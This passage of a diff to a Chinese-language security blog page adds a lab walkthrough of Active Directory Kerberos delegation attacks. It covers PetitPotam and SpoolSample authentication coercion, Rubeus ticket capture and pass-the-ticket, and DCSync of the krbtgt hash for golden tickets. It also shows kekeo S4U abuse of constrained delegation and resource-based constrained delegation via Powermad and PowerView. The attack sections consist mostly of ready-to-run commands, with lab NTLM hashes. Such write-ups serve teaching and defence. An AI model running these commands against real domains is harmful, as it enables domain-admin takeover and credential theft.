+<p>PetitPotam漏洞原理：用于强制 Windows 主机通过 <code>MS-EFSRPC`` EfsRpcOpenFileRaw</code> 或其他功能向其他计算机进行身份验证</p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>这里直接演示跨域，因为域控制器本身就是满足非约束委派要求</p>
+<h4 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a>工具准备：</h4><p>SpoolSample.exe：<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
+<p>PetitPotam.exe：<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">https://github.com/topotam/PetitPotam</a></p>
+<h4 id="PetitPotam："><a href="#PetitPotam：" class="headerlink" title="PetitPotam："></a>PetitPotam：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe <span class="number">10.10</span>.<span class="number">10.20</span> ad.dt.com <span class="number">1</span>  <span class="comment">#这里需要注意使用域名访问利用，ip利用失败。ad.dt.com为主域控制器</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328021434968.png" alt="image-20220328021434968"></p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328021541291.png" alt="image-20220328021541291"></p>
+<p>利用成功后会返回主域的域管理员票据。但是这里的票据使用mimikatz导出导入不能直接使用但是Rubeus可以直接使用，不知道原因。</p>
+<p>但是可以用Rubeus.exe获取到票据。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe  monitor /filteruser:AD<span class="variable">$</span> /interval:<span class="number">5</span>  <span class="comment">#这里过滤获取到的是主域机器账号票据，获取不到域管理员的。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220329030000500.png" alt="image-20220329030000500"></p>
+<p>使用powershell转成票据供mimikatz使用也可以用Rubeus直接导入使用：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">IO.File</span>]::WriteAllBytes(<span class="string">&quot;ticket.kirbi&quot;</span>, [<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;&quot;</span>))</span><br><span class="line">Rubeus.exe ptt /ticket: doIEvDCCB......</span><br></pre></td></tr></table></figure>
+
+<p>查看票据是主域的krbtgt的票据：</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220329031500956.png" alt="image-20220329031500956"></p>
+<p>然后导出krbtgt的hash，找到域管理员的sid即可制作黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:dt.com /all /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220329032358645.png" alt="image-20220329032358645"></p>
+<h4 id="SpoolSample："><a href="#SpoolSample：" class="headerlink" title="SpoolSample："></a>SpoolSample：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe ad.dt.com test.test.dt.com    <span class="comment">#test.test.dt.com子域控制器、ad.dt.com主域控制器</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328022150400.png" alt="image-20220328022150400"></p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220328022219103.png" alt="image-20220328022219103"></p>
+<p>这之后也是一样的情况，按照SpoolSample后续操作。</p>
+<h1 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h1><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，通过白名单的方式限制受委派的服务可以哪些服务。Kerberos不能直接为用户或者用户组构造特殊的票据来实现委派，于是将kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p>
+<h2 id="约束委派利用"><a href="#约束委派利用" class="headerlink" title="约束委派利用"></a>约束委派利用</h2><ol>
+<li>通过约束委派伪造任意用户访问特定服务。</li>
+<li>如果服务是krbtgt可以构造黄金票据。</li>
+</ol>
+<h2 id="约束委派实践"><a href="#约束委派实践" class="headerlink" title="约束委派实践"></a>约束委派实践</h2><p><strong>实验设置</strong>：</p>
+<p>设置web006为约束委派机器账号，约束委派服务是web01机器的cifs服务。并且勾选任何身份验证协议。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330010727356.png" alt="image-20220330010727356"></p>
+<p><strong>实验操作：</strong></p>
+<p>kekeo：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
+<p>获取到委派机器用户或者委派服务用户之后，利用kekeo请求该用户TGT</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:web006<span class="variable">$</span> /domain:dt.com /NTLM:d972224dc9bd7ab2338565a486ce8c29 /ticket:test.kirbi   <span class="comment">#机器用户可以mimikatz获取NTLM Hash</span></span><br><span class="line">tgt::ask /user:web /domain:dt.com /password:password /ticket:test.kirbi   <span class="comment">#服务用户账号密码</span></span><br><span class="line">tgt::ask /user:web /domain:dt.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec /ticket:test.kirbi   <span class="comment">#服务用户账号NTLM Hash</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330005056889.png" alt="image-20220330005056889"></p>
+<p>获取到委派用户的TGT票据，TGT_web006$@DT.COM_krbtgt~<a href="mailto:&#100;&#x74;&#x2e;&#x63;&#x6f;&#109;&#64;&#68;&#x54;&#46;&#x43;&#x4f;&#x4d;&#46;&#107;&#105;&#x72;&#x62;&#x69;">&#100;&#x74;&#x2e;&#x63;&#x6f;&#109;&#64;&#68;&#x54;&#46;&#x43;&#x4f;&#x4d;&#46;&#107;&#105;&#x72;&#x62;&#x69;</a></p>
+<p>使用委派用户TGT伪造s4u请求以<code>administrator</code>用户身份请求访问<code>web01</code>的ST</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_web006<span class="variable">$</span>@DT.COM_krbtgt~dt.com@DT.COM.kirbi /user:Administrator@dt.com /service:cifs/web01.dt.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330010808186.png" alt="image-20220330010808186"></p>
+<p><code>S4U2Self</code>获取到ST1</p>
+<p><code>S4U2Proxy</code>获取到WEB01的CIFS服务的ST2</p>
+<p>然后我们用mimikatz将ST2导入当前会话即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@dt.com@DT.COM_cifs~WEB01.DT.COM@DT.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330011059734.png" alt="image-20220330011059734"></p>
+<p>之后可以成功访问到web01的cifs服务。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330013644460.png" alt="image-20220330013644460"></p>
+<h1 id="基于资源约束委派"><a href="#基于资源约束委派" class="headerlink" title="基于资源约束委派"></a>基于资源约束委派</h1><p>基于资源约束委派是在约束委派中又增加了一个白名单，委派访问的第三方服务限制委派的机器用户或者服务用户。</p>
+<h2 id="基于资源约束委派利用"><a href="#基于资源约束委派利用" class="headerlink" title="基于资源约束委派利用"></a>基于资源约束委派利用</h2><p>基于资源约束委派的利用主要是利用可以修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的用户。这个属性就是限制委派的机器用户和服务用户。如果能够修改这个属性，并且能添加机器用户，那么通过S4U2Self协议可以将机器用户伪造成机器管理员账号。</p>
+<h2 id="基于资源约束委派实践"><a href="#基于资源约束委派实践" class="headerlink" title="基于资源约束委派实践"></a>基于资源约束委派实践</h2><p><strong>实验设置：</strong></p>
+<p>目标：web01.dt.com</p>
+<p>加入域用户：web2012</p>
+<p><strong>实验操作：</strong></p>
+<ol>
+<li>通过用户sid查询此用户加入域内机器</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /all <span class="comment">#查看SID</span></span><br><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=dt,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=S-1-5-21-957916131-314401718-656287447-1105))&quot;</span> cn sAMAccountType objectCategory  <span class="comment">#使用AdFind</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span>  | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="string">&quot;S-1-5-21-957916131-314401718-656287447-1105&quot;</span>&#125; | <span class="built_in">select</span> objectdn,activedirectoryrights | <span class="built_in">sort</span> <span class="literal">-Unique</span> <span class="comment">#使用powerview</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330033409768.png" alt="image-20220330033409768"></p>
+<ol start="2">
+<li>添加机器账号</li>
+</ol>
+<p>powermad：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line"><span class="built_in">Import-Module</span> ./Powermad.ps1</span><br><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> ceshi <span class="literal">-Password</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;cheshi123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330040138880.png" alt="image-20220330040138880"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADComputer</span> ceshi <span class="comment">#获取机器用户sid</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220330041536956.png" alt="image-20220330041536956"></p>
+<ol start="2">
+<li>修改msDS-AllowedToActOnBehalfOfOtherIdentity</li>
+</ol>
+<p>Windows 2012 以下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line"><span class="built_in">Import-Module</span> ./powerview.ps1</span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-957916131-314401718-656287447-1118)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> web01 | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p>Windows 2012 以上</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> yukong <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> ceshi<span class="variable">$</span></span><br><span class="line"><span class="comment">#需要在powershell中import-module ./Microsoft.ActiveDirectory.Management.dll</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331010422685.png" alt="image-20220331010422685"></p>
+<ol start="2">
+<li>伪造票据</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:ceshi /password:cheshi123 /domain:dt.com   </span><br><span class="line">Rubeus.exe s4u /user:ceshi<span class="variable">$</span> /rc4:<span class="number">3</span>DFBCA1BE2D1088D21F9D72D61D578<span class="built_in">CD</span> /impersonateuser:Administrator /msdsspn:cifs/web01.dt.com /ptt  <span class="comment">#使用完整的机器域名</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331010249531.png" alt="image-20220331010249531"></p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331010857783.png" alt="image-20220331010857783"></p>
+<ol start="3">
+<li>使用票据访问对应的服务</li>
+</ol>
+<p>设置c:\test目录必须域管理员或者系统管理才能访问。</p>
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331011335856.png" alt="image-20220331011335856"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\web01.dt.com\c<span class="variable">$</span>\test  <span class="comment">#测试访问成功</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/02/25/Kerberos(4)-%E9%9D%9E%E7%BA%A6%E6%9D%9F&%E7%BA%A6%E6%9D%9F&%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/image-20220331011438447.png" alt="image-20220331011438447"></p>
+
   </div>
 </article>
 
@@ -183,7 +387,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3%EF%BC%88%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-x2F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-x2F-%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源约束委派）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">2.</span> <span class="toc-text">非约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">非约束委派利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.2.</span> <span class="toc-text">非约束委派实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA%E7%94%A8%E6%88%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">非约束委派主机用户利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text">非约束委派服务用户利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1-x2F-efsrpc-PetitPotam"><span class="toc-number">2.3.</span> <span class="toc-text">非约束委派+Spooler打印机服务&#x2F;efsrpc-PetitPotam</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.1.</span> <span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87%EF%BC%9A"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">工具准备：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PetitPotam%EF%BC%9A"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">PetitPotam：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SpoolSample%EF%BC%9A"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">SpoolSample：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">3.</span> <span class="toc-text">约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">约束委派利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%AE%9E%E8%B7%B5"><span class="toc-number">3.2.</span> <span class="toc-text">约束委派实践</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.</span> <span class="toc-text">基于资源约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">基于资源约束委派利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%AE%9E%E8%B7%B5"><span class="toc-number">4.2.</span> <span class="toc-text">基于资源约束委派实践</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -204,10 +408,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
   </div>
@@ -264,7 +468,7 @@
   <script type="text/javascript">
   $(function() {
     // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"클립보드에 복사하였습니다!\">";
     btn += '<i class="far fa-clone"></i>';
     btn += '</span>'; 
     // mount it!
@@ -275,7 +479,7 @@
       }
     });
     clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.trigger.setAttribute('aria-label', "복사하였습니다!");
       e.clearSelection();
     })
   })
